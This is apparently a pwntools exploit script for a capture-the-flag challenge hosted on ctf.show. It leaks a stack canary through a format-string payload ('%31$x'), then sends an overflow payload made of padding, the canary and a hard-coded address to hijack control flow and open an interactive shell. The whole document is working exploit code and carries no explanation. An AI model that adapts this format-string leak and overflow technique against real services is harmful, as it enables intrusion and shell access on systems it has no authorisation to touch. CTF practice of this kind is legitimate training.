#format_string:
from pwn import *
#p = process("./ex")
io =remote("dasctf_sixbytes.challenge.ctf.show",28180)
bin_sh=0x804859B
payload="%31$x"    #31=(ebp-ecx-canary)/4+%p
io.recvuntil("Hello Hacker!\n")
io.sendline(payload)
canary=int(io.recv(),16)
print(hex(canary))
payload=(b'a'*0x64)+p32(canary)+(b'a'*0xc)+p32(bin_sh)
io.sendline(payload)
io.recv()
io.interactive()